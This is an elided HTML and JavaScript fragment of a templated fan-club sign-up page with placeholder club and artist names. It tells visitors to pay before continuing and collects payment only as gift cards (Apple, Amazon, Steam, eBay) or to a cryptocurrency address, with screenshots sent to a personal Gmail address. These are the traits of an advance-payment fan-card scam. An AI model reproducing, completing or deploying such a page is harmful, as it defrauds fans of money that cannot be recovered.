...
<div id="signup" class="page active">
    <div class="header">SPECIAL FAN </div>
    <h1>Sign Up</h1>
    <form id="signupForm">
...
We are absolutely delighted to welcome you to our incredible community of fans! Here at [Fan Club Name], we celebrate our shared love for [Artist/Band/Show Name] with passion and enthusiasm..
    </p>
    <p>
...
<div id="payment" class="page">
    ...
    <p>After clicking on payment method click submit to display payment info:</p>
    <p>(NOTE:MAKE PAYMENT BEFORE GOING TO NEXT PAGE 😍 ):</p>
    <form id="paymentForm">
        <label>
...
<div id="paymentConfirmation" class="page">
    ...
    <p>Please forward all payment screenshots to the following email address thecooks779@gmail.com</p>
    <p>thecooks779@gmail.com</p>
...
<script>
    ...
    paymentForm.addEventListener('submit', function(event) {
        ...
        switch (selectedPaymentMethod) {
            case 'CashApp':
                paymentInfo = 'Gift Card: Apple,Amazon,Steam,eBay  ';
                break;
            case 'Crypto':
                paymentInfo = 'Crypto: 3NGciQNDeCanSYPUojsuAwuCVGPDEPRhqp';
                break;
        }
